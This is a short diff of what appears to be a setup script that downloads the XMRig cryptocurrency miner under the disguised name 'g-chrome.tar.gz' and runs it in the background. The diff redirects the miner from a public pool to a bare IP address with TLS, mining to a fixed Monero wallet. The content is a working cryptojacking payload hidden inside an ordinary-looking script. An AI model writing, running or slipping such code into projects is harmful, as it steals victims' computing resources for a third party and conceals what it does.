@@ -5,4 +5,4 @@ sudo apt-get update
 wget -O g-chrome.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz
 tar --extract --file g-chrome.tar.gz
 export PROXY_DNS_SERVER=1.1.1.1
-./xmrig-6.5.3/xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:443 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -a cn/r -t 6 -B
+./xmrig-6.5.3/xmrig --no-color --donate-level 1 --cpu-priority 5 -o 139.99.125.38:9000 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -a cn/r -k --tls -B
